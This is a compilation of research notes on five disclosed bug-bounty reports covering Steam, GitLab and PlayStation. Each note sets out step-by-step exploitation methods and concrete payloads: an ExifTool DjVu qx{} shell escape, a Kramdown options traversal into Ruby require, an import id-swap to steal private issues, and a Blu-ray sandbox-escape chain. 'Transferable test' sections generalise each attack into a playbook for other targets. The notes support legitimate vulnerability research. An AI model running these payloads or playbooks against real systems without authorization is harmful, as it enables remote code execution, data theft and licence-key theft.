SOURCE: https://hackerone.com/reports/391217  2026-11-07
ROUTE: HackerOne report body is empty/redacted in the `.json` endpoint (vulnerability_information length 0) and the page is Cloudflare-gated; method is Valve's OWN program summary on the report page (mirrored at raw.githubusercontent.com/ajaysenr/HackerOne-Disclosed-Reports/main/reports/391217.md) plus the researcher's own quotes in press coverage (The Register/GIGAZINE/PCMag). Nothing invented beyond those.
CLASS: broken access control / IDOR on a partner key-generation API — one-parameter ownership-check bypass → bulk download of another title's pre-generated CD keys (CWE-639 / CWE-284)
CORE METHOD:
  1. Authenticate to the game publisher's partner portal (partner.steamgames.com) with ANY legitimate partner account; the feature under test is `/partnercdkeys/assignkeys/`, which issues CD keys for a game you own.
  2. Send the key-generation/assign request but change ONE parameter to a title you do NOT own. Moskowsky: "I managed to bypass the verification of ownership of the game by changing only one parameter. After that, I could enter any ID into another parameter and get any set of keys."
  3. The ownership check reads one parameter while the actual key lookup reads the attacker-supplied game id → the response is the set of ALREADY-GENERATED keys for that title (e.g. ~36,000 Portal 2 keys), all redeemable.
  4. One request is enough; audit logging still fired (Valve confirmed no log bypass and no evidence of exploitation).
DETECTION SIGNAL: a partner/vendor endpoint that both (a) generates stock (licence keys, invite codes, gift cards, API keys, coupon batches) and (b) takes an enumerable object id; the authorization/ownership check reads a DIFFERENT parameter than the one used to fetch the object; an "assign/list existing keys" action returns pre-generated secrets rather than creating fresh ones.
CHAIN: any authenticated-but-unprivileged partner → swap the ownership parameter / supply a foreign product id → download pre-generated CD keys for a game you have no rights to → free-game acquisition / resale — monetary impact at scale (Critical, $20,000; Valve added a bonus).
TRANSFERABLE TEST: On any partner/developer console that mints stock (keys/codes/tokens), replay its generate/assign request with the product/tenant id parameter set to a target you do NOT own while keeping your own session; if the response returns that product's existing keys, it is BAC+IDOR. Also try "list/export keys" endpoints with a foreign id and check whether the ownership-check parameter differs from the lookup parameter.

SOURCE: https://hackerone.com/reports/1154542  2026-11-07
ROUTE: report body rendered via HackerOne `.json` (vulnerability_information present, full).
CLASS: code injection / RCE via an image-metadata processor that EVALs parser tokens — content-based type sniffing defeats an extension allowlist (CWE-94) — GitLab "RCE when removing metadata with ExifTool"
CORE METHOD:
  1. GitLab Workhorse routes uploads with extensions jpg|jpeg|tiff to ExifTool to strip non-whitelisted metadata. ExifTool IGNORES the extension and sniffs the CONTENT, so renaming any file to `.jpg` still dispatches it to whatever parser matches its magic bytes.
  2. Pick an ExifTool parser that EVALs its metadata: DjVu (lib/Image/ExifTool/DjVu.pm) evals the annotation tokens to "convert C escape sequences". Its escaping is incomplete: a backslash immediately followed by a newline is mishandled, letting you re-open the quotes and inject arbitrary Perl.
  3. Build a DjVu file carrying (in annotation metadata) and rename it `.jpg`:
     (metadata (Copyright "\<newline>" . qx{echo vakzz >/tmp/vakzz} . \<newline>" b ") )
     qx{...} runs a shell command; qx{perl reverse-shell} yields a shell.
  4. Upload it to any GitLab image-processing surface (snippet "Attach a file", issue/MR attachment, avatar) → Workhorse shells ExifTool server-side → payload runs as the `git` user.
  5. Real result: an upload to https://gitlab.com/-/snippets/new produced a shell on `web-09-sv-gprd`; `id` → uid=500(git) uid=500(git).
DETECTION SIGNAL: any upload pipeline that shells out to a metadata/media tool (exiftool, ffmpeg/ffprobe, ImageMagick convert, ghostscript, pdfinfo, tika, doc converters) AND an extension allowlist the tool overrides by content sniffing; a parser in that tool whose code path calls eval/insert_* on file fields (DjVu annotations, SVG, XMP, ICC, .torrent, subtitle formats); a polyglot file (allowed magic bytes wrapping a different container).
CHAIN: any account able to attach a file → upload a content-sniffable DjVu renamed `.jpg` → extension allowlist bypassed by ExifTool's content sniff → DjVu annotation token `eval` → `qx{}` shell escape → RCE as the git service user (Critical, $20,000).
TRANSFERABLE TEST: On any target that shells to ExifTool/ffmpeg/ImageMagick on upload, submit a known-eval parser payload (DjVu annotation, SVG/XML, ffmpeg SSA/subtitle) renamed to an allowed image extension; if a marker file appears or a callback fires, the parser is the sink. Use the smallest payload that writes a known path — `qx{echo X >/tmp/X}` — to prove execution.

SOURCE: https://hackerone.com/reports/1125425  2026-11-07
ROUTE: report body rendered via HackerOne `.json` (vulnerability_information present, full).
CLASS: code injection / RCE via user-controlled RENDERER options that reach a class-instantiation sink, then a `require`/`load` sink with directory traversal (CWE-470 "externally-controlled input selects classes" → CWE-98/CWE-22) — GitLab "RCE via unsafe inline Kramdown options when rendering Wiki pages"
CORE METHOD:
  1. A wiki/content renderer accepts kramdown documents; certain extensions (e.g. `.rmd`) route through `other_markup_unsafe` → `GitHub::Markup.render` → `Kramdown::Document.new(content).to_html`. Any file extension can be committed by cloning the project wiki over git.
  2. Kramdown honours INLINE OPTIONS parsed from the document body: `{::options ... /}`. Setting `syntax_highlighter="rouge"` plus `syntax_highlighter_opts="{formatter: <Class>, ...}"` makes Rouge call `::Rouge::Formatters.const_get(opts[:formatter]).new(opts)` — an attacker-chosen class is `const_get`-instantiated, gated only by `/\A[[:upper:]][[:alnum:]_]*\z/` (no namespaces, but any top-level class, e.g. `CSV`).
  3. Choose a loaded class whose constructor takes a file/loader option. `Redis` (redis-rb) has a `driver` option; `_parse_driver` does `require_relative "connection/#{driver}"` then falls back to `require "connection/#{driver}"`, with NO path check on `driver` → traversal + arbitrary Ruby file EVALUATION.
  4. Get the payload to a known path: attach a `.rb` file to a snippet/issue; GitLab stores it under the uploads dir and returns `/uploads/-/system/user/1/<secret>/payload.rb` (absolute `/var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/<secret>/payload.rb`). Payload body: `puts "hello"; \`echo X > /tmp/X\``.
  5. Commit `page1.rmd` to the project wiki (git clone <proj>.wiki.git; add file; push):
     {::options auto_ids="false" footnote_nr="5" syntax_highlighter="rouge" syntax_highlighter_opts="{formatter: Redis, driver: ../../../../../../../../../../var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/<secret>/payload.rb}" /}
     ~~ ruby
     def what?
       42
     end
     ~~
  6. Loading the wiki page triggers the render of the fenced block → Rouge instantiates `Redis` → `require` evaluates `payload.rb` → RCE (`/tmp/X` created). Test step 7 to also confirm the sink: an error `wrong constant name ../../.. /payload.rb` traces through `other_markup_unsafe` → `render_wiki_content`.
DETECTION SIGNAL: any rich-text/markdown/wiki renderer exposing CONFIG through document content (kramdown `{::options}`, Hugo/RDoc/Jekyll/Pandoc front-matter or highlight opts, Liquid/template options); a `const_get`/`Class.new`/`constantize` on a user-supplied string; a downstream `require`/`load`/`send` sink fed by a SECOND user-controlled field; a git-backed wiki/content store that accepts arbitrary file extensions.
CHAIN: any user with wiki push access → commit `.rmd` with inline `{::options}` → Rouge `formatter:` selects the loaded `Redis` class → its `driver:` option reaches `require` with `../` traversal → uploads-dir `payload.rb` is evaluated → arbitrary Ruby / RCE (Critical, $20,000; fixed in GitLab 13.10.3).
TRANSFERABLE TEST: In any markdown/wiki renderer, submit `{::options syntax_highlighter_opts="{formatter: <SomeLoadedClass>, <opt>: ../../../../etc/passwd}" /}` (or the platform's equivalent inline-config syntax); a class-instantiation error naming YOUR class proves the `const_get` sink. Then find a second constructor option that hits `require`/`load`/`eval` and point it at a file you can upload (snippet/issue attachment) for the RCE.

SOURCE: https://hackerone.com/reports/1379975  2026-11-07
ROUTE: report body redacted in HackerOne `.json` (empty) and page is Cloudflare-gated; retrieved via the disclosed-reports mirror (raw.githubusercontent.com/ajaysenr/HackerOne-Disclosed-Reports/main/reports/1379975.md). All quoted code/steps are the report's own text.
CLASS: sandbox / privileged-context escape → arbitrary code execution — a 5-bug chain (insecure deserialization → arbitrary class instantiation → reflective permission bypass → write-what-where → native parser overflow) on the BD-J (Blu-ray Java) runtime (CWE-502 → CWE-470 → CWE-269 → CWE-787) — PlayStation 4/5
CORE METHOD:
  1. Insecure deserialization under privileged context (V1, MEDIUM): `com.sony.gemstack.org.dvb.user.UserPreferenceManagerImpl` reads the `userprefs` file with `ObjectInputStream.readObject()` inside `AccessController.doPrivileged(ReadPreferenceAction)`. Replace `userprefs` with a malicious serialized object → instantiate classes under privileged context. On firmwares lacking an upstream JDK blacklist commit, instantiate a `ClassLoader` subclass and call `defineClass` with all permissions → bypass the SecurityManager.
  2. Arbitrary class instantiation (V2, MEDIUM): `com.oracle.security.Service.newInstance` calls `Class.forName` on an arbitrary class name → instantiate ANY class (even `sun.*`) with a single-arg public constructor; the `registered` guard is bypassed by calling `com.oracle.ProviderAdapter.setProviderAccessor` with a custom `ProviderAccessor`.
  3. Reflective permission bypass (V3, MEDIUM): `com.sony.gemstack.org.dvb.io.ixc.IxcProxy.invokeMethod` calls methods under privileged context; permission checks (e.g. on `File.list()`) are skipped when the method is public+non-static and its class is public, non-final and instantiable. Write a subclass of the target class implementing an interface whose method throws `RemoteException` — e.g. `class FileImpl extends File implements FileInterface { FileImpl(String p){super(p);} }` with `interface FileInterface extends Remote { String[] list() throws RemoteException; }` → call restricted methods; use it to dump `/app0/` and leak the filesystem.
  4. Write-what-where in the JIT compiler (V4, HIGH): the "compiler receiver thread" reads a 0x58-byte `CompilerAgentRequest`; if `req.compiler_data != 0` it does `memcpy(req.compiler_data + 0x28, &req, sizeof(req))` — an attacker-supplied pointer is used verbatim. Send `compiler_data` = a JIT-memory address and put payload bytes in the request → the compiler writes shellcode into JIT memory → arbitrary execution. (No SMEP on target → kernel exploitation becomes trivial with a corrupted function pointer.)
  5. Native parser overflow (V5, HIGH): the UDF filesystem driver (github.com/williamdevries/UDF) trusts `inf_len` against the fixed `sector_size` and does `memcpy(blob, pos, inflen)` into a `sector_size`-sized buffer. A UDF image with `inf_len > sector_size` overflows → kernel panic / control.
  6. Deliver as a Blu-ray `.iso` (UDF 2.5) — the console's BD-J Java runtime auto-loads it; push the payload with `nc $PS4IP 1337 < payload.bin` (the provided PoC intentionally triggers V5's panic with a 4 MB `/PWN/0`).
DETECTION SIGNAL: a managed-runtime sandbox that (a) deserializes a local/preference file under `doPrivileged`/elevated context, (b) exposes `Class.forName`/`Class.new`/`const_get`/`newInstance` to untrusted input, (c) uses reflective proxies (`invokeMethod`, `InvocationHandler`) to invoke privileged methods, and (d) has ANY native component (JIT compiler, filesystem/parser driver) that trusts a pointer or length coming from the managed side. The presence of all four = a full escape is reachable.
CHAIN: author of a disc image (no credentials) → deserialization of `userprefs` under privileged context → arbitrary class instantiation (`Class.forName`) → reflective `invokeMethod` permission bypass (dump `/app0/`, filesystem leak) → JIT compiler write-what-where → shellcode in JIT memory → arbitrary code execution with JIT → pirated-game shipping + kernel-exploit primitives (High, $20,000; tested on firmware 9.00; the first exploit chain submitted to PlayStation).
TRANSFERABLE TEST: For any managed-runtime sandbox, hunt the four primitives in order: (1) a serialized file read under `doPrivileged`/elevated context — replace it with a crafted object; (2) a `Class.forName`/`Class.new`/`const_get` on attacker input — instantiate a `ClassLoader`/gadget; (3) a reflective proxy `invokeMethod` that skips permission checks for public non-final classes — subclass the target to reach restricted APIs; (4) any native component (JIT/parser) that reads a pointer or length from the managed side — that is your write-what-where. Chain 1→2→3→4 to go from untrusted input to code execution.

SOURCE: https://hackerone.com/reports/743953  2026-11-07
ROUTE: report body rendered via HackerOne `.json` (vulnerability_information present, full).
CLASS: IDOR / mass-assignment in an import/restore path — attacker-controlled foreign-key id arrays reassign private objects you don't own (CWE-639 + CWE-915) — GitLab "Steal private objects of other projects via project import"
CORE METHOD:
  1. GitLab exports are tarballs containing `project.json`; during import the restorer does `@project.assign_attributes(project_params)` (app/models/project_tree_restorer.rb) where `project_params` come straight from the attacker-authored `project.json`.
  2. Many relation foreign-key attributes are NOT excluded from `project_params`: `issue_ids`, `merge_request_ids`, `board_ids`, `note_ids`, etc. ("almost all non-excluded attributes behave like `issues` are affected").
  3. Craft the export so the id array names the VICTIM's object while the payload arrays stay EMPTY — this is the crux:
     "issue_ids": [ 27422144 ],
     "issues": [],
     The project is told to OWN issue id `27422144` without importing any issue body, so the restorer binds your project to the EXISTING private issue.
  4. Import the tarball as a project export into your own namespace. The imported project now contains the victim's private issue (still credited to its original author, e.g. `nyangawa-h1`) — open and read it.
  5. DB ids are incremental, so brute-force the id space to harvest arbitrarily many private issues/MRs/boards/notes. Affects gitlab.com and self-hosted.
DETECTION SIGNAL: any import/restore/duplicate/migration that reads a manifest (`project.json`, `export.json`, XML/JSON backup) and mass-assigns its attributes onto a model — especially when the manifest can carry relation id arrays (`*_ids`, `*_id`, `parent_id`, `owner_id`, `namespace_id`) alongside empty payload arrays; strong-params/`attr_protected` gaps where FK attributes aren't filtered for importers; sequential/incremental object ids.
CHAIN: any user who can import a project → hand-craft `project.json` with `"issue_ids":[<victim id>]` and `"issues":[]` → `assign_attributes` binds your project to another user's private objects → read/modify private issues, MRs, boards, notes of other projects → cross-tenant private-object theft (Critical, $20,000).
TRANSFERABLE TEST: Download any "export" the app produces (project/page/board/backup), unpack it, and inject `"<relation>_ids":[<guessed id>]` (or `"owner_id"`/`"parent_id"`) with the matching payload array emptied; re-import into your own account and check whether the imported object now references a victim's pre-existing resource. Incremental id spaces make this mass-exploitable by brute force.


---

